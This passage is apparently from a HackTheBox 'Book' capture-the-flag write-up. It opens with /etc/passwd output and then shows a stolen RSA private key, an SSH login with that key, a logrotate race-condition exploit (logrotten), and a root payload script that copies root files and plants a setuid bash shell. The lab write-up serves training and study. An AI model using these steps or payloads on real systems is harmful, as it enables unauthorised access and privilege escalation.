</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>network</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>100</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Network</span> <span class=n>Management</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>netif</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>resolve</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>101</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Resolver</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>resolve</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>syslog</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=mi>106</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>syslog</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>messagebus</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=mi>107</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>_apt</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lxd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>105</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>lxd</span><span class=o>/</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>uuidd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>106</span><span class=p>:</span><span class=mi>110</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>uuidd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>dnsmasq</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>107</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>dnsmasq</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>misc</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>landscape</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>108</span><span class=p>:</span><span class=mi>112</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>landscape</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>pollinate</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>109</span><span class=p>:</span><span class=mi>1</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>pollinate</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>sshd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>110</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>sshd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>reader</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=n>reader</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>reader</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>mysql</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>111</span><span class=p>:</span><span class=mi>114</span><span class=p>:</span><span class=n>MySQL</span> <span class=n>Server</span><span class=p>,,,:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span></code></pre></td></tr></table></div></div><p>We can see there is a <em>reader</em> user, let&rsquo;s try to investigate is home directory
<code>/home/reader</code>.</p><p>I found <code>/home/reader/.ssh/id_rsa</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
</span></span><span class=line><span class=cl>G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
</span></span><span class=line><span class=cl>WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
</span></span><span class=line><span class=cl>ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
</span></span><span class=line><span class=cl>7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
</span></span><span class=line><span class=cl>75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
</span></span><span class=line><span class=cl>3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
</span></span><span class=line><span class=cl>McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
</span></span><span class=line><span class=cl>tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
</span></span><span class=line><span class=cl>jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
</span></span><span class=line><span class=cl>7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
</span></span><span class=line><span class=cl>GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
</span></span><span class=line><span class=cl>E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
</span></span><span class=line><span class=cl>ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
</span></span><span class=line><span class=cl>SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
</span></span><span class=line><span class=cl>skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
</span></span><span class=line><span class=cl>o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
</span></span><span class=line><span class=cl>Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
</span></span><span class=line><span class=cl>hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
</span></span><span class=line><span class=cl>Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
</span></span><span class=line><span class=cl>sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
</span></span><span class=line><span class=cl>tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
</span></span><span class=line><span class=cl>5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
</span></span><span class=line><span class=cl>y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
</span></span><span class=line><span class=cl>nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s fix the rights so openssh won&rsquo;t complain: <code>chmod 400 id_rsa</code>.
Then we can connect via ssh as <em>reader</em> using the private key.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh reader@10.10.10.176 -i id_rsa
</span></span></code></pre></td></tr></table></div></div><p>At this point we can read <code>user.txt</code>.</p><h3 id=privilege-escalation-of-machine>Privilege Escalation of Machine<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine>#</a></h3><p><a href=https://github.com/DominicBreuker/pspy>pspy</a> allows us too see process of other users or that doesn&rsquo;t live very long.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>2020/04/19 19:43:17 CMD: UID=0    PID=41530  | /usr/sbin/logrotate -f /root/log.cfg 
</span></span><span class=line><span class=cl>2020/04/19 19:43:17 CMD: UID=0    PID=41529  | /bin/sh /root/log.sh 
</span></span><span class=line><span class=cl>2020/04/19 19:43:17 CMD: UID=0    PID=41531  | sleep 5 
</span></span><span class=line><span class=cl>2020/04/19 19:43:20 CMD: UID=0    PID=41534  | /bin/sh /root/log.sh 
</span></span><span class=line><span class=cl>2020/04/19 19:43:20 CMD: UID=0    PID=41533  | /lib/systemd/systemd-udevd 
</span></span><span class=line><span class=cl>2020/04/19 19:43:20 CMD: UID=0    PID=41532  | /bin/sh /root/log.sh 
</span></span></code></pre></td></tr></table></div></div><p>It seems there is a logrotate task running as root.</p><p><a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation>https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation</a></p><p>So we will able to exploit a vulnerability named <em>logrotten</em>, by writing in a
file rotated by logrorate we will be able to write a file in any location.</p><p>Since there is a <code>backup</code> folder right under our nose and an <code>access.log</code> file
we can write into that seems to be rotated, let&rsquo;s assume we can exploit this
vulnerability.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>reader@book:~$ ls -lh backups/
</span></span><span class=line><span class=cl>total 4.0K
</span></span><span class=line><span class=cl>-rw-r--r-- 1 reader reader  0 Jan 29 13:05 access.log
</span></span><span class=line><span class=cl>-rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.1
</span></span></code></pre></td></tr></table></div></div><p><a href=https://github.com/whotwagner/logrotten>https://github.com/whotwagner/logrotten</a></p><p>We can download and compile the exploit, then prepare our payload file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ gcc -o logrotten logrotten.c
</span></span></code></pre></td></tr></table></div></div><p>We can fill the file to force the rotation and execute the exploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ./logrotten -p daolyap /home/reader/backups/access.log
</span></span><span class=line><span class=cl>$ echo &#34;test&#34; &gt; access.log
</span></span></code></pre></td></tr></table></div></div><p>Since it&rsquo;s a race condition it may need several execution before working.</p><p>The log file and our payload file will be written into
<code>/etc/bash_completition.d/</code> so next time root will log in it will execute our
payload (maybe a cron task).</p><p>Full paper: <a href=https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition>https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>if</span> <span class=o>[</span> <span class=sb>`</span>id -u<span class=sb>`</span> -eq <span class=m>0</span> <span class=o>]</span>
</span></span><span class=line><span class=cl><span class=k>then</span>
</span></span><span class=line><span class=cl>        cp /root/log.sh /tmp/cyfun/log.sh <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>        cp /root/log.cfg /tmp/cyfun/log.cfg <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>        cp /root/root.txt /tmp/cyfun/cyfun.txt
</span></span><span class=line><span class=cl>        chmod +r /tmp/cyfun/cyfun.txt
</span></span><span class=line><span class=cl>        cp /bin/bash /tmp/cyfun/cyfun
</span></span><span class=line><span class=cl>        chmod +s /tmb/cyfun/cyfun
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></td></tr></table></div></div><p>Read root.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat log.sh
</span></span><span class=line><span class=cl><span class=c1>#!/bin/sh</span>
</span></span><span class=line><span class=cl>/usr/sbin/logrotate -f /root/log.cfg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat log.cfg
</span></span><span class=line><span class=cl>/home/reader/backups/access.log <span class=o>{</span>
</span></span><span class=line><span class=cl>        daily
</span></span><span class=line><span class=cl>        rotate <span class=m>12</span>
</span></span><span class=line><span class=cl>        missingok
</span></span><span class=line><span class=cl>        notifempty
</span></span><span class=line><span class=cl>        size 1k
</span></span><span class=line><span class=cl>        create
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>